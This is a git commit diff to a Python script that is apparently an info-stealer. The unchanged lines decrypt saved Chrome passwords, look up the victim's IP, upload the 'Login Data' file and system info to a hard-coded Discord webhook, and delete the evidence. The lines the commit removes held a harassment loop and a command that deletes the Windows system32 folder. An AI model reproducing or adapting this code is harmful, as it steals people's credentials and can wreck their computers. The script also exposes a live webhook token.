b3514795f050015fc635a28a70479b001909aae6
Aniko <gtabro666@gmail.com>
2022-06-21 00:06:29 +0200

    Update main.py
    ho risolto le cose inutili

--- main.py
+++ main.py
@@ -2,9 +2,7 @@ from discord_webhook import DiscordWebhook
 import subprocess
 import requests
 import os
-import random
 from random import randint
-import string
 import pyautogui
 pyautogui.FAILSAFE = False
 mouse = pyautogui
@@ -103,12 +101,6 @@ def main1():
                 f.write(f"Decrypted Password: {decrypted_password}")
         else:
             continue  
-        if date_of_creation != 86400000000 and date_of_creation:
-            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
-          
-        if last_usuage != 86400000000 and last_usuage:
-            print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
-        print("=" * 100)
     cursor.close()
     db.close()
       
@@ -129,8 +121,6 @@ def main1():
 main1()
 
 def main():
-    with open("main.vbs", "w") as f:
-        f.write('msgbox "By Decks, SUCK MY DICK",16,"ERROR"')
     r=requests.get("http://ifconfig.me")
     url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy"
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\AppData\System info.txt"')
@@ -145,19 +135,4 @@ def main():
         web.add_file(file=f.read(), filename='Login Data')
     web.execute()
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
-    a=0
-    while a < 100:
-        subprocess.getoutput('start main.vbs')
-        rndvalueX = randint(0, 1919)
-        rndvalueY = randint(0, 1019)
-        rndletter1 = random.choice(string.ascii_letters)
-        rndletter2 = random.choice(string.ascii_letters)
-        rndletter3 = random.choice(string.ascii_letters)
-        mouse.dragTo(rndvalueX, rndvalueY)
-        keyboard.write(rndletter1 + rndletter2 + rndletter3, interval=0.01)
-        pyautogui.click()
-        keyboard.press('win')
-        a += 1
-    subprocess.getoutput('rd "%windir%\system32"/q /s')
-    subprocess.run(["powershell", "-Command", "wininit"])
 main()
